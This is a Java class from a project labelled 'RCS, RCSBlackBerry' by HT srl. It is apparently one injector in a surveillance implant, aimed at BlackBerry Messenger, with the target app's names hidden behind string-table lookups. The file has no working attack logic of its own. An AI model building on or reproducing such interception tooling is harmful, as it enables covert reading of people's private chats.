//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.injection.injectors;

import blackberry.Messages;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.injectors.group.ChatGroupInjector;

public class BBMInjector extends ChatGroupInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("BBMInjector", DebugLevel.VERBOSE);
    //#endif

    public String getAppName() {
        // M.0=Messenger
        return Messages.getString("M.0");
    }

    public String getCodName() {
        // M.1=net_rim_bb_qm_peer
        return Messages.getString("M.1");
    }

}
